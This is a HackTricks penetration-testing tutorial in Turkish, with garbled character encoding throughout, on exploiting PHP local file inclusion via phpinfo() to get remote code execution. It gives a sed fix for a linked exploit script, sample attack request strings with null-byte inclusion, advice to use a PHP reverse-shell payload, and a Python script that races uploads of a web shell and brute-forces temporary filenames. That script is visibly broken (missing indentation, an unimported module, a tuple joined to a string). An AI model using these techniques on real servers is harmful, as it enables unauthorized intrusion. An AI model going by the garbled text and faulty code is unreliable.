<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **katkÄ±da bulunun**.

</details>


Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in gerekenler: **Bir LFI zafiyeti, phpinfo() fonksiyonunun gÃ¶rÃ¼ntÃ¼lendiÄŸi bir sayfa, "file\_uploads = on" ve sunucunun "/tmp" dizinine yazabilmesi.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**HTB Ã–ÄŸretici**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

Exploit'i dÃ¼zeltmeniz gerekiyor (**=>** yerine **=>** deÄŸiÅŸtirin). Bunu yapmak iÃ§in:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Exploitin baÅŸÄ±nda **payload**'u (Ã¶rneÄŸin bir php-rev-shell iÃ§in) deÄŸiÅŸtirmeniz gerekmektedir, **REQ1**'i (bu phpinfo sayfasÄ±na iÅŸaret etmeli ve padding dahil edilmelidir, yani: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), ve **LFIREQ**'yi (bu LFI zafiyetine iÅŸaret etmelidir, yani: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Null karakteri sÃ¶mÃ¼rÃ¼lÃ¼rken Ã§ift "%" kontrol edin)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Teori

EÄŸer PHP'de yÃ¼klemelere izin veriliyorsa ve bir dosya yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, bu dosya sunucu isteÄŸi iÅŸlemeyi bitirene kadar bir geÃ§ici dizinde depolanÄ±r, ardÄ±ndan bu geÃ§ici dosya silinir.

ArdÄ±ndan, web sunucusunda bir LFI zafiyeti bulduysanÄ±z, oluÅŸturulan geÃ§ici dosyanÄ±n adÄ±nÄ± tahmin etmeye Ã§alÄ±ÅŸabilir ve dosya silinmeden Ã¶nce geÃ§ici dosyaya eriÅŸerek bir RCE'yi sÃ¶mÃ¼rebilirsiniz.

**Windows**'ta dosyalar genellikle **C:\Windows\temp\php** dizininde depolanÄ±r.

**Linux**'ta dosyanÄ±n adÄ± genellikle **rastgele** ve **/tmp** dizininde bulunur. Ad rastgele olduÄŸu iÃ§in, geÃ§ici dosyanÄ±n adÄ±nÄ± **bir yerden Ã§Ä±karmak gerekmektedir** ve phpconfig() fonksiyonunun iÃ§eriÄŸindeki **$\_FILES** deÄŸiÅŸkeninin deÄŸerini okuyarak bunu yapabilirsiniz.

**phpinfo()**

**PHP**, bir **4096B** tampon kullanÄ±r ve tampon **dolu olduÄŸunda**, **istemciye gÃ¶nderilir**. ArdÄ±ndan istemci, bÃ¼yÃ¼k baÅŸlÄ±klar kullanarak **birÃ§ok bÃ¼yÃ¼k istek gÃ¶nderebilir** (php ters shell yÃ¼klemek iÃ§in), geÃ§ici dosyanÄ±n adÄ±nÄ±n dÃ¶ndÃ¼rÃ¼ldÃ¼ÄŸÃ¼ **phpinfo()**'nun ilk kÄ±smÄ±nÄ±n gelmesini bekleyebilir ve LFI zafiyetini sÃ¶mÃ¼rerek php sunucusu dosyayÄ± silmeden Ã¶nce geÃ§ici dosyaya eriÅŸmeye Ã§alÄ±ÅŸabilir.

**UzunluÄŸu 6 ise adÄ± tahmin etmek iÃ§in Python betiÄŸi**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
